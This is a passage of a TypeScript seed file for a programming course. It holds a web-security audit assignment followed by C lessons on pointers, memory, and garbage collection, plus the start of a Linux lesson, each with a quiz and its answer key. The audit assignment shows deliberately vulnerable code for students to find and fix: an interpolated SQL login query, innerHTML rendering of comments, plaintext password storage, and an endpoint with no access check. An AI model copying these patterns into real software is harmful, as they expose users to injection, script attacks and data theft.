      `Time to put everything together. You'll perform a security audit of a small, deliberately flawed web application and write up your findings like a real security assessment.\n\n## Scenario\n\nYou're reviewing a simple app with a login form, a comment section, and a "search users" feature. Here's a sketch of how it currently works:\n\n\`\`\`js\n// Login check\nconst query = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;\n\n// Rendering a comment\nelement.innerHTML = comment.text;\n\n// Password storage\nawait db.query('INSERT INTO users (email, password) VALUES (?, ?)', [email, password]);\n\n// Any logged-in user can call this to view any other user's private profile:\napp.get('/api/users/:id', (req, res) => res.json(getUser(req.params.id)));\n\`\`\`\n\n## Requirements\n\nWrite up a security audit report (as a markdown file in a repo, or a doc, your choice) that includes:\n\n1. **Identify at least 4 distinct vulnerabilities** in the scenario above, name each one using proper terminology (e.g. "SQL injection", "stored XSS", "broken access control", "insecure password storage").\n2. For each vulnerability, explain **how an attacker could exploit it** in plain language, one or two sentences is enough.\n3. For each vulnerability, propose a **specific fix**, referencing techniques from this course (parameterized queries, output escaping, password hashing, authorization checks, etc.).\n4. Rank the four vulnerabilities by severity (which would you fix first, and why?).\n5. Add a short "general recommendations" section with at least 2 practices a team could adopt going forward (e.g. dependency scanning, code review checklists, MFA for admin accounts).\n\n## Stretch goals\n\n- Propose a rewritten, safe version of one of the vulnerable code snippets above.\n- Research and briefly summarize one real-world breach that resulted from a vulnerability of the same class as one you identified.\n\nSubmit a link to your finished report below (a repo, gist, or shared doc), an instructor will review it before you can mark this lesson complete. Good luck! 🔒`
    ),
    requiresSubmission: true,
  },
];

const cLessons: SeedLesson[] = [
  {
    title: 'C Basics',
    content: lessonContent(
      'C Basics',
      `C is a compiled, statically-typed language from 1972 that still powers operating systems, databases, and language runtimes today. Learning C means learning how a computer actually works, no hidden garbage collector, no implicit conversions you didn't ask for, just you and the machine.\n\n## Your first program\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    printf("Hello, Kodstigen!\\n");\n    return 0;\n}\n\`\`\`\n\n- \`#include <stdio.h>\` pulls in the standard I/O library, so \`printf\` exists.\n- \`int main(void)\` is the entry point every C program starts from, it returns an \`int\` **exit code** to the operating system, \`0\` means "success".\n- \`printf\` formats and prints text, \`\\n\` is a newline escape sequence, unlike Python there's no automatic newline after a print.\n\n## Compiling and running\n\nC is compiled ahead of time, there's no interpreter:\n\n\`\`\`bash\ngcc hello.c -o hello\n./hello\n\`\`\`\n\n\`gcc\` translates your \`.c\` source file into a native executable, \`-o hello\` names the output file. Every time you change the source, you recompile before running again.\n\n## Variables and types\n\nUnlike Python or JavaScript, every variable in C has a fixed, explicit type:\n\n\`\`\`c\nint xp = 0;\nfloat ratio = 0.5f;\nchar grade = 'A';\nxp += 10;\n\`\`\`\n\nThere's no \`var\`/\`let\` inference, you declare the type up front and it never changes. This is why C is fast, the compiler knows exactly how much memory each variable needs and never has to check types at runtime.\n\n> [!TIP]\n> C has no built-in string type, a "string" is really just an array of \`char\` ending in a special \`\\0\` (null terminator) byte. You'll see why that matters a lot once we get to pointers.`
    ),
    quiz: {
      title: 'C Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does main() returning 0 signal to the operating system?',
          options: ['An error occurred', 'The program succeeded', 'The program is still running', 'Nothing, the return value is ignored'],
          answer: 'The program succeeded',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In C, a variable\'s type must be declared up front and cannot change later.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to compile hello.c into an executable called hello with gcc is: gcc hello.c -o ____',
          options: [],
          answer: 'hello',
        },
      ],
    },
  },
  {
    title: 'Structs',
    content: lessonContent(
      'Structs',
      `C has no classes, but it has **structs**: a way to group related variables together under one name.\n\n\`\`\`c\n#include <stdio.h>\n\nstruct Point {\n    int x;\n    int y;\n};\n\nint main(void) {\n    struct Point p = { .x = 3, .y = 4 };\n    printf("(%d, %d)\\n", p.x, p.y);\n    p.x += 1;\n    return 0;\n}\n\`\`\`\n\n\`.x\` and \`.y\` are the struct's **members**, accessed with the dot operator. \`{ .x = 3, .y = 4 }\` is a designated initializer, it sets each member by name so the order doesn't matter and the intent is clear.\n\n## Memory layout\n\nA struct isn't magic, it's just its members laid out **contiguously** in memory, one right after another, in declaration order (the compiler may add small gaps called padding for alignment, but conceptually think of it as one solid block):\n\n\`\`\`c\nstruct Point {   // sizeof(struct Point) is typically 8 bytes\n    int x;        // bytes 0-3\n    int y;        // bytes 4-7\n};\n\`\`\`\n\nThis matters a lot once pointers enter the picture: a pointer to a struct is just an address pointing at the start of that block, and every member is at a fixed, predictable offset from it.\n\n## typedef\n\nWriting \`struct Point\` everywhere gets tedious, \`typedef\` gives it a shorter alias:\n\n\`\`\`c\ntypedef struct {\n    int x;\n    int y;\n} Point;\n\nPoint p = { 3, 4 };\n\`\`\`\n\nNow \`Point\` can be used on its own, exactly like a built-in type such as \`int\`.`
    ),
    quiz: {
      title: 'Structs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "How are a struct's members arranged in memory?",
          options: ['Randomly, wherever there is free space', 'Contiguously, one after another', 'Each member gets its own separate heap allocation', 'They are not stored, only computed on access'],
          answer: 'Contiguously, one after another',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'typedef creates a shorter alias for a type, like naming an anonymous struct Point instead of writing struct Point every time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Given "struct Point p;", you access its x member with the ____ operator: p.x',
          options: [],
          answer: 'dot',
        },
      ],
    },
  },
  {
    title: 'Pointers',
    content: lessonContent(
      'Pointers',
      `A **pointer** is just a variable that stores a memory address instead of a value. That's it, everything else about pointers is a consequence of that one idea.\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    int xp = 10;\n    int *xpPtr = &xp;   // xpPtr holds the address of xp\n\n    printf("value: %d\\n", xp);       // 10\n    printf("address: %p\\n", (void*)&xp);\n    printf("via pointer: %d\\n", *xpPtr); // 10, dereferenced\n\n    *xpPtr = 20;    // writes through the pointer\n    printf("now: %d\\n", xp);         // 20\n    return 0;\n}\n\`\`\`\n\n- \`&xp\` is the **address-of** operator, "give me the memory address where \`xp\` lives".\n- \`int *xpPtr\` declares \`xpPtr\` as "a pointer to an \`int\`".\n- \`*xpPtr\` is the **dereference** operator used on an existing pointer, "go to the address this pointer holds, and give me (or set) the value there".\n\n## Why bother?\n\nWithout pointers, C functions can only work with **copies** of the arguments you pass in:\n\n\`\`\`c\n#include <stdio.h>\n\nvoid doubleIt(int n) {\n    n = n * 2;   // only changes the local copy\n}\n\nvoid doubleItProperly(int *n) {\n    *n = *n * 2; // changes the caller's variable\n}\n\nint main(void) {\n    int x = 5;\n    doubleIt(x);\n    printf("%d\\n", x);          // still 5\n    doubleItProperly(&x);\n    printf("%d\\n", x);          // now 10\n    return 0;\n}\n\`\`\`\n\nPassing a pointer lets a function reach back into the caller's memory and modify it directly, this is how C simulates "pass by reference" since it only ever passes values (and an address is just a value).\n\n> [!WARNING]\n> A pointer that doesn't point at valid memory (never initialized, or freed already) is called a **dangling pointer**. Dereferencing one is undefined behavior, it might crash, or worse, silently corrupt unrelated memory. Always initialize pointers, even to \`NULL\`.`
    ),
    quiz: {
      title: 'Pointers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the & operator do when applied to a variable?',
          options: ['Doubles its value', 'Returns its memory address', 'Dereferences it', 'Deletes it'],
          answer: 'Returns its memory address',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Passing a pointer to a function lets that function modify the caller\'s original variable.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Given "int *p = &x;", the ____ operator (*p) reads or writes the value p points to.',
          options: [],
          answer: 'dereference',
        },
      ],
    },
  },
  {
    title: 'Enums',
    content: lessonContent(
      'Enums',
      `An **enum** (enumeration) creates a set of named integer constants, useful whenever a variable should only ever hold one of a small, fixed set of values.\n\n\`\`\`c\n#include <stdio.h>\n\nenum Status {\n    PENDING,   // 0\n    APPROVED,  // 1\n    REJECTED   // 2\n};\n\nint main(void) {\n    enum Status s = APPROVED;\n    if (s == APPROVED) {\n        printf("Approved!\\n");\n    }\n    return 0;\n}\n\`\`\`\n\nBy default, the first member is \`0\` and each following one increments by \`1\`. You can override this explicitly:\n\n\`\`\`c\nenum HttpStatus {\n    OK = 200,\n    NOT_FOUND = 404,\n    SERVER_ERROR = 500\n};\n\`\`\`\n\n## Why not just use plain ints?\n\nYou *could* use \`#define APPROVED 1\`, but an enum gives the compiler (and your editor) a real type to check, so passing an unrelated integer where a \`Status\` is expected can trigger a warning, and switch statements over an enum can warn you if you forgot to handle a case:\n\n\`\`\`c\n#include <stdio.h>\n\nenum Status { PENDING, APPROVED, REJECTED };\n\nint main(void) {\n    enum Status s = APPROVED;\n    switch (s) {\n        case PENDING:  printf("Waiting...\\n"); break;\n        case APPROVED: printf("Approved!\\n"); break;\n        case REJECTED: printf("Rejected.\\n"); break;\n    }\n    return 0;\n}\n\`\`\`\n\nUnder the hood, an enum value really is just an \`int\`, C has no runtime type safety here, it's purely a naming and readability convenience, but a very useful one.`
    ),
    quiz: {
      title: 'Enums Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'By default, what integer value does the first member of an enum get?',
          options: ['1', '0', '-1', 'It is undefined'],
          answer: '0',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can explicitly assign a specific integer value to an enum member, like OK = 200.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Under the hood, an enum value in C is really just an ____.',
          options: [],
          answer: 'int',
        },
      ],
    },
  },
  {
    title: 'Unions',
    content: lessonContent(
      'Unions',
      `If you know TypeScript, a "union type" there means a value that could be *one of several different types* (\`string | number\`), and the compiler tracks which. A C \`union\` is a completely different, much lower-level idea: it's a block of memory that all its members **share**, one at a time.\n\n\`\`\`c\n#include <stdio.h>\n\nunion Value {\n    int asInt;\n    float asFloat;\n    char asChar[4];\n};\n\nint main(void) {\n    union Value v;\n    v.asInt = 65;\n    printf("%d\\n", v.asInt);    // 65\n    printf("%c\\n", v.asChar[0]); // 'A', same bytes read as a char\n    return 0;\n}\n\`\`\`\n\nUnlike a struct, where every member gets its **own** space (so the struct's total size is the sum of its members), a union's members all **overlap the same bytes**. Its total size is only as big as its *largest* member, because only one member is ever "live" at a time, writing to one member overwrites whatever was in the others.\n\n## Why use one?\n\nUnions save memory when you need to represent "this is either an A or a B, never both at once" without wasting space storing both. They're commonly paired with a separate "tag" field (often an enum) to remember which member is currently valid, since the union itself has no idea:\n\n\`\`\`c\nenum ValueType { TYPE_INT, TYPE_FLOAT };\n\nstruct TaggedValue {\n    enum ValueType type;\n    union {\n        int asInt;\n        float asFloat;\n    } data;\n};\n\`\`\`\n\nThis "tagged union" pattern is exactly how many interpreters and virtual machines represent dynamically-typed values internally, worth remembering, you'll build something very close to it later in this course.`
    ),
    quiz: {
      title: 'Unions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is the size of a C union roughly equal to?",
          options: ['The sum of all its members', 'The size of its largest member', 'Always 8 bytes', 'The size of its first member only'],
          answer: 'The size of its largest member',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A C union's members occupy separate, non-overlapping memory, similar to a struct.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Pairing a union with an enum "tag" field to remember which member is currently valid is called a ____ union.',
          options: [],
          answer: 'tagged',
        },
      ],
    },
  },
  {
    title: 'Stack and Heap',
    content: lessonContent(
      'Stack and Heap',
      `Every running C program has two very different places to put data: the **stack** and the **heap**. Understanding the difference is essential once your programs get bigger than a single function.\n\n## The stack\n\nLocal variables live on the stack, memory is claimed automatically when a function is called and freed automatically the instant it returns:\n\n\`\`\`c\n#include <stdio.h>\n\nvoid greet(void) {\n    char name[32] = "Ada"; // lives on the stack\n    printf("Hi, %s\\n", name);\n} // name's memory is reclaimed right here, automatically\n\nint main(void) {\n    greet();\n    return 0;\n}\n\`\`\`\n\nThe stack is extremely fast (allocating is just moving a pointer), but limited in size (usually a few MB) and strictly scoped, you can never return a pointer to a local stack variable and use it after the function returns, that memory is gone.\n\n## The heap\n\nThe heap is a much larger pool of memory that you manage **manually**, with \`malloc\` and \`free\`:\n\n\`\`\`c\n#include <stdlib.h>\n\nint main(void) {\n    int *numbers = malloc(10 * sizeof(int)); // ask for room for 10 ints\n    if (numbers == NULL) {\n        // malloc failed, out of memory\n        return 1;\n    }\n    numbers[0] = 42;\n    free(numbers); // you MUST free it yourself when done\n    numbers = NULL; // avoid leaving a dangling pointer around\n    return 0;\n}\n\`\`\`\n\nHeap memory survives until you explicitly \`free\` it, which is exactly what makes it useful for data that needs to outlive the function that created it, and exactly what makes it dangerous: forget to \`free\` and you leak memory, \`free\` twice or use it after freeing and you get undefined behavior.\n\n| | Stack | Heap |\n|---|---|---|\n| Managed by | The compiler, automatically | You, manually (malloc/free) |\n| Speed | Very fast | Slower |\n| Size | Small, fixed | Large, limited by system RAM |\n| Lifetime | Ends when function returns | Until you free it |\n\n> [!WARNING]\n> Forgetting to \`free\` heap memory is a **memory leak**. This is exactly the problem garbage collectors exist to solve, and exactly what you'll build one for later in this course.`
    ),
    quiz: {
      title: 'Stack and Heap Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which memory region is automatically reclaimed the instant a function returns?',
          options: ['The heap', 'The stack', 'Neither, both require manual free()', 'Both, automatically'],
          answer: 'The stack',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Memory allocated with malloc() must be freed manually with free(), it is not reclaimed automatically.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Forgetting to free heap memory that is no longer used is called a memory ____.',
          options: [],
          answer: 'leak',
        },
      ],
    },
  },
  {
    title: 'Advanced Pointers',
    content: lessonContent(
      'Advanced Pointers',
      `You thought pointers were hard? Wrong. The rest is just applying the same one idea, "a variable holding an address", one more layer deep.\n\n## Pointers to pointers\n\nA pointer can point at another pointer, useful whenever a function needs to modify **which address** the caller's pointer holds, not just the value at that address:\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid allocate(int **outPtr) {\n    *outPtr = malloc(sizeof(int)); // sets the CALLER's pointer\n    **outPtr = 42;\n}\n\nint main(void) {\n    int *p = NULL;\n    allocate(&p);        // pass the address OF the pointer\n    printf("%d\\n", *p);  // 42\n    free(p);\n    return 0;\n}\n\`\`\`\n\n\`int **outPtr\` reads right-to-left: "\`outPtr\` is a pointer to (a pointer to an \`int\`)". \`*outPtr\` gives you the inner pointer, \`**outPtr\` dereferences all the way down to the \`int\` itself.\n\n## Pointers and arrays\n\nAn array name, used in most expressions, "decays" into a pointer to its first element, this is why array indexing and pointer arithmetic are interchangeable in C:\n\n\`\`\`c\n#include <stdio.h>\n\nint main(void) {\n    int scores[3] = {10, 20, 30};\n    int *p = scores;       // decays to &scores[0]\n\n    printf("%d\\n", scores[1]); // 20\n    printf("%d\\n", *(p + 1));  // 20, identical operation\n    p++;                        // now points at scores[1]\n    return 0;\n}\n\`\`\`\n\n\`p + 1\` doesn't add 1 byte, it adds \`1 * sizeof(int)\` bytes, pointer arithmetic automatically scales by the size of whatever type the pointer points to.\n\n## Function pointers\n\nA pointer can even point at executable code, letting you pass a function around like a value:\n\n\`\`\`c\n#include <stdio.h>\n\nint square(int n) { return n * n; }\n\nint apply(int (*fn)(int), int value) {\n    return fn(value);\n}\n\nint main(void) {\n    int result = apply(square, 5); // 25\n    printf("%d\\n", result);\n    return 0;\n}\n\`\`\`\n\n\`int (*fn)(int)\` declares \`fn\` as "a pointer to a function taking an \`int\` and returning an \`int\`", this is the mechanism behind callbacks in C, and it's exactly how the object system you'll build next represents dynamic behavior.`
    ),
    quiz: {
      title: 'Advanced Pointers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why would a function take an int** (pointer to a pointer) parameter?',
          options: ['To make the code look more advanced', 'To modify which address the caller\'s own pointer holds', 'It is required for all malloc calls', 'To avoid using arrays'],
          answer: "To modify which address the caller's own pointer holds",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'For an int pointer p, the expression (p + 1) advances by exactly 1 byte, regardless of type.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In most expressions, an array name automatically ____ into a pointer to its first element.',
          options: [],
          answer: 'decays',
        },
      ],
    },
  },
  {
    title: 'Stack Data Structure',
    content: lessonContent(
      'Stack Data Structure',
      `Time to combine structs and pointers into a real, reusable data structure: a **stack** (last-in, first-out), backed by the heap so it can grow.\n\n\`\`\`c\n#include <stdlib.h>\n\ntypedef struct {\n    int *items;\n    int count;\n    int capacity;\n} IntStack;\n\nIntStack *stackCreate(int capacity) {\n    IntStack *s = malloc(sizeof(IntStack));\n    s->items = malloc(capacity * sizeof(int));\n    s->count = 0;\n    s->capacity = capacity;\n    return s;\n}\n\nvoid stackPush(IntStack *s, int value) {\n    if (s->count == s->capacity) return; // full, ignoring for simplicity\n    s->items[s->count] = value;\n    s->count++;\n}\n\nint stackPop(IntStack *s) {\n    s->count--;\n    return s->items[s->count];\n}\n\nvoid stackFree(IntStack *s) {\n    free(s->items); // free the array first...\n    free(s);        // ...then the struct that describes it\n}\n\`\`\`\n\n## The arrow operator\n\n\`s->items\` is shorthand for \`(*s).items\`, "dereference the pointer \`s\`, then access the \`items\` member". Since working with pointers-to-structs is so common in C, \`->\` exists purely to avoid writing \`(*s).\` everywhere.\n\n## Where does each piece live?\n\nThis is the key insight for this lesson: \`stackCreate\` allocates **two separate heap blocks**, the \`IntStack\` struct itself, and the \`items\` array it points to. They're independent allocations linked only by the pointer stored inside the struct, which is exactly why \`stackFree\` must free both, and in the right order, freeing \`s\` before \`s->items\` would leak the array's memory forever since you'd lose the only pointer to it.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n\ntypedef struct {\n    int *items;\n    int count;\n    int capacity;\n} IntStack;\n\nIntStack *stackCreate(int capacity) {\n    IntStack *s = malloc(sizeof(IntStack));\n    s->items = malloc(capacity * sizeof(int));\n    s->count = 0;\n    s->capacity = capacity;\n    return s;\n}\n\nvoid stackPush(IntStack *s, int value) {\n    if (s->count == s->capacity) return;\n    s->items[s->count] = value;\n    s->count++;\n}\n\nint stackPop(IntStack *s) {\n    s->count--;\n    return s->items[s->count];\n}\n\nvoid stackFree(IntStack *s) {\n    free(s->items);\n    free(s);\n}\n\nint main(void) {\n    IntStack *s = stackCreate(10);\n    stackPush(s, 1);\n    stackPush(s, 2);\n    printf("%d\\n", stackPop(s)); // 2, last in, first out\n    stackFree(s);\n    return 0;\n}\n\`\`\``
    ),
    quiz: {
      title: 'Stack Data Structure Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the -> operator do?',
          options: ['Compares two pointers', 'Dereferences a pointer and accesses a member in one step', 'Allocates memory', 'Declares a function pointer'],
          answer: 'Dereferences a pointer and accesses a member in one step',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In the IntStack example, freeing the struct before freeing its items array would leak the array\'s memory.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A stack follows a "last in, first ____" ordering.',
          options: [],
          answer: 'out',
        },
      ],
    },
  },
  {
    title: 'Objects',
    content: lessonContent(
      'Objects',
      `C has no built-in "object" concept, but you can build your own object system using exactly the tools you already have: structs, tagged unions, and function pointers. This is the same foundation real language runtimes (Python's CPython, Lua's VM) are built on.\n\n\`\`\`c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\ntypedef enum {\n    OBJ_INT,\n    OBJ_STRING\n} ObjType;\n\ntypedef struct Obj {\n    ObjType type;\n    int refCount;      // we'll use this in the next lesson\n    union {\n        int intValue;\n        char *stringValue;\n    } as;\n} Obj;\n\nObj *objNewInt(int value) {\n    Obj *obj = malloc(sizeof(Obj));\n    obj->type = OBJ_INT;\n    obj->refCount = 1;\n    obj->as.intValue = value;\n    return obj;\n}\n\nObj *objNewString(const char *value) {\n    Obj *obj = malloc(sizeof(Obj));\n    obj->type = OBJ_STRING;\n    obj->refCount = 1;\n    obj->as.stringValue = strdup(value); // heap-allocate a copy\n    return obj;\n}\n\nvoid objPrint(Obj *obj) {\n    switch (obj->type) {\n        case OBJ_INT:    printf("%d\\n", obj->as.intValue); break;\n        case OBJ_STRING:  printf("%s\\n", obj->as.stringValue); break;\n    }\n}\n\nint main(void) {\n    Obj *a = objNewInt(42);\n    Obj *b = objNewString("hello");\n    objPrint(a);\n    objPrint(b);\n    return 0;\n}\n\`\`\`\n\nThis is the **tagged union** pattern from a few lessons ago, put to real use: \`Obj\` can represent *any* value your future language or program needs, and \`type\` tells every function which union member is actually valid right now.\n\n## Why refCount is already here\n\nEvery \`Obj\` is heap-allocated (so it can outlive the function that created it and be shared around freely), which means something has to decide **when it's safe to free**. That's exactly the problem the next two lessons solve, this \`refCount\` field is the first piece of a reference-counting garbage collector, and this \`Obj\` struct is what it will manage.`
    ),
    quiz: {
      title: 'Objects Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In the Obj struct, what determines which member of the "as" union is currently valid?',
          options: ['The refCount field', 'The order the struct was declared in', 'The type field', 'Nothing, you must guess'],
          answer: 'The type field',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Obj in this design is heap-allocated so it can be shared and outlive the function that created it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Combining a type tag with a union to represent any kind of value is called a tagged ____.',
          options: [],
          answer: 'union',
        },
      ],
    },
  },
  {
    title: 'Refcounting GC',
    content: lessonContent(
      'Refcounting GC',
      `A garbage collector's job is simple to state and tricky to implement: automatically free heap memory once nothing needs it anymore. **Reference counting** is the simplest strategy, every \`Obj\` tracks how many places are pointing at it, and frees itself the moment that count hits zero.\n\n\`\`\`c\n#include <stdlib.h>\n\n// Obj/ObjType are the type from the previous lesson, assumed already defined above in the same file\n\nvoid objRetain(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount++;\n}\n\nvoid objRelease(Obj *obj) {\n    if (obj == NULL) return;\n    obj->refCount--;\n    if (obj->refCount == 0) {\n        if (obj->type == OBJ_STRING) {\n            free(obj->as.stringValue); // free the string data first\n        }\n        free(obj); // then the Obj itself\n    }\n}\n\`\`\`\n\nThe rule every piece of code has to follow religiously: call \`objRetain\` whenever you store a new reference to an object (assign it to another variable, put it in a list, etc.), and \`objRelease\` whenever that reference goes away.\n\n\`\`\`c\nObj *a = objNewInt(42);   // refCount = 1\nObj *b = a;\nobjRetain(b);              // refCount = 2, two owners now\n\nobjRelease(a);             // refCount = 1, still alive\nobjRelease(b);             // refCount = 0, freed here\n\`\`\`\n\n## The fatal flaw: cycles\n\nRefcounting has one well-known blind spot, if object A holds a reference to B, and B holds a reference right back to A, their counts can never reach zero, even if nothing outside the pair references either of them anymore. That memory leaks forever. This isn't a bug you can patch, it's fundamental to how refcounting works, which is exactly why the next lesson introduces a completely different strategy.\n\n> [!TIP]\n> This exact tradeoff is why Python uses reference counting *plus* a supplementary cycle detector, and why some languages (like the one you're about to build a collector for) choose mark-and-sweep instead, no cycle problem, at the cost of needing to pause and scan everything periodically.`
    ),
    quiz: {
      title: 'Refcounting GC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In reference counting, when is an object freed?',
          options: ['On a fixed timer', 'When its reference count reaches zero', 'When the program exits', 'Whenever malloc runs low on memory'],
          answer: 'When its reference count reaches zero',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Reference counting correctly frees two objects that reference each other in a cycle, even if nothing else references them.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Two objects that reference each other so their counts never reach zero form a reference ____.',
          options: [],
          answer: 'cycle',
        },
      ],
    },
  },
  {
    title: 'Mark and Sweep GC',
    content: lessonContent(
      'Mark and Sweep GC',
      `**Mark-and-sweep** takes a completely different approach from reference counting: instead of tracking counts continuously, it periodically pauses the program and asks one question directly, "starting from everything currently reachable, what's still alive?" Anything left over gets swept away.\n\nIt runs in two phases:\n\n1. **Mark**: starting from a set of "roots" (global variables, local variables currently on the stack), recursively visit every object reachable from them, flagging each one as \`marked\`.\n2. **Sweep**: walk every object the allocator has ever handed out, free any that *weren't* marked, then clear the marks for next time.\n\n\`\`\`c\n#include <stdlib.h>\n\ntypedef struct Obj {\n    ObjType type;\n    int marked;        // replaces refCount\n    struct Obj *next;   // every object, linked so sweep can walk them all\n    union {\n        int intValue;\n        char *stringValue;\n    } as;\n} Obj;\n\nvoid markObject(Obj *obj) {\n    if (obj == NULL || obj->marked) return; // already visited, avoid infinite loops on cycles\n    obj->marked = 1;\n    // if this object type could reference other Objs, mark those too here\n}\n\nvoid sweep(Obj **allObjects) {\n    Obj **current = allObjects;\n    while (*current != NULL) {\n        if (!(*current)->marked) {\n            Obj *unreached = *current;\n            *current = unreached->next; // unlink it\n            free(unreached);\n        } else {\n            (*current)->marked = 0; // reset for next collection\n            current = &(*current)->next;\n        }\n    }\n}\n\`\`\`\n\nNotice \`markObject\` checks \`obj->marked\` **before** recursing, this is exactly what solves the cycle problem from the last lesson: two objects referencing each other both simply get marked once each, then correctly swept together if nothing external points to either.\n\n## The tradeoff\n\n| | Refcounting | Mark and Sweep |\n|---|---|---|\n| Handles cycles | No | Yes |\n| Overhead | A little, on every assignment | A pause during collection |\n| Simplicity | Simpler per-operation | More bookkeeping (roots, linked list of all objects) |\n\nNeither is strictly "better", refcounting is used where memory needs to be freed the instant it's unreachable (like Swift's ARC), mark-and-sweep is used where occasional pauses are acceptable in exchange for never leaking cycles (like most JavaScript engines).\n\n## Final project\n\nCombine everything from this course: write a small C program with an \`Obj\` type (int and string, like the earlier lessons), a way to track "roots", and a working \`mark\` + \`sweep\` pair that correctly frees unreached objects, including a deliberate reference cycle to prove it doesn't leak. Submit a link to your repository below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
    quiz: {
      title: 'Mark and Sweep GC Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What are the two phases of a mark-and-sweep collector?',
          options: ['Allocate and free', 'Mark and sweep', 'Retain and release', 'Push and pop'],
          answer: 'Mark and sweep',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Mark-and-sweep correctly frees a reference cycle that nothing external points to, unlike plain refcounting.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The starting points a mark-and-sweep collector walks from (globals, the current stack) are called ____.',
          options: [],
          answer: 'roots',
        },
      ],
    },
  },
];

const linuxLessons: SeedLesson[] = [
  {
    title: 'The Command Line',
    content: lessonContent(
      'The Command Line',
      `A command-line interface (CLI) lets you control a computer by typing text commands instead of clicking through menus. It looks intimidating at first, but it's often faster and, crucially, **scriptable**: anything you can type, you can save and re-run automatically.\n\n## Why text beats clicking\n\n- A CLI command can be copy-pasted, shared, and reproduced exactly, a screenshot of "click here, then here" cannot.\n- Commands compose: the output of one command can feed directly into another (more on that soon).\n- Almost every server in the world has no graphical interface at all, the CLI isn't a retro curiosity, it's how most computing actually happens.\n\n## Your first commands\n\n\`\`\`bash\nwhoami        # who am I logged in as?\npwd           # print working directory, where am I?\necho "hi"     # print text\ndate          # current date and time\n\`\`\`\n\nEvery command follows roughly the same shape: a program name, optionally followed by **flags** (options, usually starting with \`-\`) and **arguments** (the things it operates on):\n\n\`\`\`bash\nls -l /home\n# ^command  ^flag  ^argument\n\`\`\`\n\n\`ls\` lists files, \`-l\` is a flag asking for the "long" (detailed) format, \`/home\` is the argument telling it which directory to list. You'll see this exact pattern, command, flags, arguments, in nearly every tool covered in this course.\n\n> [!TIP]\n> Stuck on what a command does or which flags it accepts? Almost every command supports \`--help\`, e.g. \`ls --help\`. That's always your first move, not memorization.`
    ),
    quiz: {
      title: 'Command Line Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of CLI commands over clicking through a GUI?',
          options: ['CLI commands always run faster on the CPU', 'They can be scripted, copied, and reproduced exactly', 'GUIs do not exist on servers', 'There is no real advantage'],
          answer: 'They can be scripted, copied, and reproduced exactly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In "ls -l /home", -l is an argument and /home is a flag.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To see the current working directory in the terminal, you run: ____',
          options: [],
          answer: 'pwd',
        },
      ],
    },
  },
  {
    title: 'Filesystems',
    content: lessonContent(
      'Filesystems',
